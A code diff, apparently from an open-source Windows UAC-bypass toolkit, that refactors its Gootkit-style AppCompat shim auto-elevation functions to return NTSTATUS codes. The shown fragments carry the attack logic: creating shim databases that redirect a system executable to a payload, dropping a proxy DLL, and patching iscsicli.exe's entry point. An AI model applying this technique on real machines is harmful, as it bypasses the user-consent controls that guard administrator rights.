@@ -1,13 +1,13 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2014 - 2018,
+*  (C) COPYRIGHT AUTHORS, 2014 - 2019,
 *  (C) MS FixIT Shim Patches revealed by Jon Erickson
 *
 *  TITLE:       GOOTKIT.C
 *
-*  VERSION:     3.11
+*  VERSION:     3.17
 *
-*  DATE:        23 Nov 2018
+*  DATE:        18 Mar 2019
 *
 *  Gootkit based AutoElevation using AppCompat.
 *
@@ -118,11 +118,11 @@ BOOL ucmRegisterAndRunTarget(
 * Fixed in Windows 10 TH1, KB3045645/KB3048097 for everything else
 *
 */
-BOOL ucmShimRedirectEXE(
+NTSTATUS ucmShimRedirectEXE(
     _In_ LPWSTR lpszPayloadEXE
 )
 {
-    BOOL bResult = FALSE;
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
     PDB hShimDb;
     GUID dbGUID, exeGUID;
     WCHAR szShimDbPath[MAX_PATH * 2];
@@ -133,15 +133,19 @@ BOOL ucmShimRedirectEXE(
     TAGID tidShim = 0;
     TAGID tidLib = 0;
 
-    if (lpszPayloadEXE == NULL)
-        return bResult;
+    if (lpszPayloadEXE == NULL) {
+        return STATUS_INVALID_PARAMETER;
+    }
 
     //
     // GUIDs are important, for both DATABASE and EXE file.
     // They used as shim identifiers and must be set.
     //
     if ((CoCreateGuid(&dbGUID) != S_OK) ||
-        (CoCreateGuid(&exeGUID) != S_OK)) return bResult;
+        (CoCreateGuid(&exeGUID) != S_OK))
+    {
+        return STATUS_INTERNAL_ERROR;
+    }
 
     RtlSecureZeroMemory(szShimDbPath, sizeof(szShimDbPath));
     _strcpy(szShimDbPath, g_ctx->szTempDirectory);
@@ -149,8 +153,9 @@ BOOL ucmShimRedirectEXE(
     _strcat(szShimDbPath, L".sdb");
 
     hShimDb = SdbCreateDatabase(szShimDbPath, DOS_PATH);
-    if (hShimDb == NULL)
-        return bResult;
+    if (hShimDb == NULL) {
+        return STATUS_INTERNAL_ERROR;
+    }
 
     //write shim DB header
     tidDB = SdbBeginWriteListTag(hShimDb, TAG_DATABASE);
@@ -194,12 +199,15 @@ BOOL ucmShimRedirectEXE(
     }
     SdbCloseDatabaseWrite(hShimDb);
 
-    bResult = ucmRegisterAndRunTarget(
+    if (ucmRegisterAndRunTarget(
         szShimDbPath,
         CLICONFG_EXE,
-        FALSE);
+        FALSE))
+    {
+        MethodResult = STATUS_SUCCESS;
+    }
 
-    return bResult;
+    return MethodResult;
 }
 
 #ifndef _WIN64
@@ -215,12 +223,12 @@ BOOL ucmShimRedirectEXE(
 * Fixed in Windows 10 TH1, KB3045645/KB3048097 for everything else
 *
 */
-BOOL ucmShimPatch(
+NTSTATUS ucmShimPatch(
     _In_ PVOID ProxyDll,
     _In_ DWORD ProxyDllSize
 )
 {
-    BOOL bResult = FALSE, cond = FALSE;
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
     PDB	 hpdb;
     GUID dbGUID, exeGUID;
 
@@ -235,14 +243,19 @@ BOOL ucmShimPatch(
     do {
 
         if ((CoCreateGuid(&dbGUID) != S_OK) ||
-            (CoCreateGuid(&exeGUID) != S_OK)) return bResult;
+            (CoCreateGuid(&exeGUID) != S_OK))
+        {
+            return STATUS_INTERNAL_ERROR;
+        }
 
         // drop Fubuki
         RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
         _strcpy(szBuffer, g_ctx->szTempDirectory);
         _strcat(szBuffer, L"r3.dll");
-        if (!supWriteBufferToFile(szBuffer, ProxyDll, ProxyDllSize))
+        if (!supWriteBufferToFile(szBuffer, ProxyDll, ProxyDllSize)) {
+            MethodResult = STATUS_UNSUCCESSFUL;
             break;
+        }
 
         RtlSecureZeroMemory(szShimDbPath, sizeof(szShimDbPath));
         _strcpy(szShimDbPath, g_ctx->szTempDirectory);
@@ -279,8 +292,10 @@ BOOL ucmShimPatch(
         _strcpy(szBuffer, g_ctx->szSystemDirectory);
         _strcat(szBuffer, ISCSICLI_EXE);
         epRVA = supQueryEntryPointRVA(szBuffer);
-        if (epRVA == 0)
+        if (epRVA == 0) {
+            MethodResult = STATUS_ENTRYPOINT_NOT_FOUND;
             break;
+        }
 
         tmp = supHeapAlloc(32 * 1024);
         if (tmp != NULL) {
@@ -328,13 +343,16 @@ BOOL ucmShimPatch(
         SdbCloseDatabaseWrite(hpdb);
 
         // Register db and run target.
-        bResult = ucmRegisterAndRunTarget(
+        if (ucmRegisterAndRunTarget(
             szShimDbPath,
             ISCSICLI_EXE,
-            TRUE);
+            TRUE))
+        {
+            MethodResult = STATUS_SUCCESS;
+        }
 
-    } while (cond);
+    } while (FALSE);
 
-    return bResult;
+    return MethodResult;
 }
 #endif /* _WIN64 */
